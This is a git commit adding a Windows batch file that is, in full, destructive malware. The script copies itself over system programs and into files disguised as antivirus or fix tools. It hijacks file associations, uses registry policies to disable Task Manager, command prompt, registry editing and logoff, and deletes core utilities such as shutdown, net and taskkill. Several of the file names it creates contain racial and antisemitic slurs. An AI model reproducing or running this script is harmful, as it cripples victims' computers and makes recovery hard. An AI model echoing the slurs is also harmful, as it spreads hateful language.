99d7c050fdebe9de95cd65bf523cad33bb03a668
2003ryans <ryanscales@yahoo.com>
2016-07-22 18:52:44 +0000

    asd

---
+++ no-skid.bat
@@ -0,0 +1,147 @@
+@echo off
+echo made by chocolateman, i just screwed around with names
+pause
+title Don't worry, it's not over
+cls
+color 0a
+copy %0 "%windir%\savaged.BAT"
+copy %0 "%windir%\HES BEEN FORKIESDDD.BAT"
+copy %0 "%windir%\Norton Antivirus.exe.bat"
+copy %0 "%windir%\Antivirus.exe.bat"
+copy %0 "%windir%\Fix-PC.exe.bat"
+copy %0 "%windir%\run-to-fix-pc.bat"
+copy %0 "%windir%\notepad.exe"
+del C:\windows\system32\dllcache\notepad.exe
+copy %0 "%windir%\regedit.exe"
+del C:\windows\system32\dllcache\regedit.exe
+copy %0 "%windir%\regedt32.exe"
+copy %0 "%windir%\system32\hal.dll"
+copy %0 "%windir%\system32\fingered.bat"
+copy %0 "%windir%\system32\savage-you.bat"
+copy %0 "%windir%\niglet.bat"
+copy %0 "%windir%\system32\hal32.exe.bat"
+copy %0 "%windir%\system32\CHOCOLATEMAN.bat"
+copy %0 "%windir%\system32\savagevirus.bat"
+copy %0 "%windir%\system32\savagesavaged.bat"
+copy %0 "%windir%\system32\its savaged its over.bat"
+copy %0 "%windir%\system32\rip pc.bat"
+copy %0 "%windir%\system32\get savaged fella.bat"
+copy %0 "%windir%\system32\run-to-fix-pc.bat"
+copy %0 "%windir%\run-to-fix-pc.bat"
+copy %0 "%windir%\system32\SAVAGEgirls.bat"
+copy %0 "%windir%\system32\getcuckedjews.bat"
+copy %0 "%windir%\system32\porno.png.bat"
+del C:\windows\system32\dllcache\msconfig.exe
+copy %0 "%windir%\system32\msconfig.exe"
+copy %0 "%windir%\system32\windows.dll.bat"
+copy %0 "%windir%\system32\windowsupdate.exe.bat"
+copy %0 "%windir%\system32\updater.dll.bat"
+copy %0 "%windir%\system32\do-not-delete-this-file.dll.bat"
+copy %0 "%programfiles%\NetMeeting\netmeeting.dll.bat"
+copy %0 "%programfiles%\NetMeeting\netmeeter.dll.bat"
+copy %0 "%programfiles%\NetMeeting\neet.dll.bat"
+copy %0 "%programfiles%\Messenger\messenger.dll.bat"
+copy %0 "%programfiles%\NetMeeting\newnotification.wav.bat"
+copy %0 "%programfiles%\Internet Explorer\browsenet.dll.bat"
+copy %0 "%programfiles%\Internet Explorer\anusbubbles.bat"
+copy %0 "%programfiles%\Internet Explorer\regtron.bat"
+copy %0 "%programfiles%\Internet Explorer\IEXPLORE.EXE"
+mkdir "%programfiles%\Chocolate and Marks World of Baseball Bats"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+copy %0 "%programfiles%\Chocolate and Marks World of Baseball Bats\%random%.bat"
+assoc.bat=Control22
+assoc.cmd=Control22
+assoc.vbs=CHOCOLATEMAN
+assoc.gif=go_find_gifs_on_imgur_kid
+assoc.html=its_time_to_stop
+assoc.htm=its_time_to_stop
+assoc.webm=its_time_to_stop
+assoc.mp4=fire_when_the_strobe_hits
+assoc.mp3=fire_when_the_strobe_hits
+assoc.vba=what_the_hell_is_a_vba_file
+assoc.js=lmao_who_uses_javascript
+assoc.jsa=lmao_who_uses_javascript
+assoc.jse=lmao_who_uses_javascript
+assoc.ahk=LoveEevee
+assoc.txt=markisntcrazy
+assoc.mid=I_AINT_BLACK
+assoc.midi=I_AINT_BLACK
+assoc.git=dat_boi
+assoc.png=no_porn_pls
+assoc.briefcase=GO_GO_GADGET
+assoc.exe=its_time_to_stop
+assoc.ink=no
+assoc.folder=murder
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFolderOptions /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFolderOptions /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileassociate /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileassociate /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 0 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 0 /f
+REG add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
+REG add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f
+REG add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
+REG add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
+REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+del C:\windows\system32\shutdown.exe /s /q /f
+del C:\windows\system32\dllcache\shutdown.exe /s /q /f
+del C:\windows\system32\logoff.exe /s /q /f
+del C:\windows\system32\dllcache\logoff.exe /s /q /f
+del C:\windows\system32\wbem\wmic.exe /s /q /f
+del C:\windows\system32\dllcache\wmic.exe /s /q /f
+del C:\windows\system32\tsdiscon.exe /s /q /f
+del C:\windows\system32\dllcache\tsdiscon.exe /s /q /f
+del C:\windows\system32\dllcache\net.exe /s /q /f
+del C:\windows\system32\net.exe /s /q /f
+del C:\windows\regedit.exe /s /q /f
+del C:\windows\system32\dllcache\regedit.exe /s /q /f
+del C:\windows\system32\regedit.exe /s /q /f
+del C:\windows\system32\dllcache\regedit.exe /s /q /f
+del C:\windows\system32\regedt32.exe /s /q /f
+del C:\windows\system32\dllcache\regedt32.exe /s /q /f
+del C:\windows\regedt32.exe /s /q /f
+del C:\windows\system32\dllcache\regedt32.exe /s /q /f
+taskkill /f /im explorer.exe
+start explorer.exe
+del C:\windows\system32\taskkill.exe /s /q /f
+del C:\windows\system32\dllcache\taskkill.exe /s /q /f
+del C:\windows\system32\tskkill.exe /s /q /f
+del C:\windows\system32\dllcache\tskkill.exe /s /q /f
+del C:\windows\system32\gpedit.msc /s /q /f
+del C:\windows\system32\dllcache\gpedit.msc /s /q /f
+del C:\windows\system32\msconfig.exe /s /q /f
+del C:\windows\system32\dllcache\msconfig.exe /s /q /f
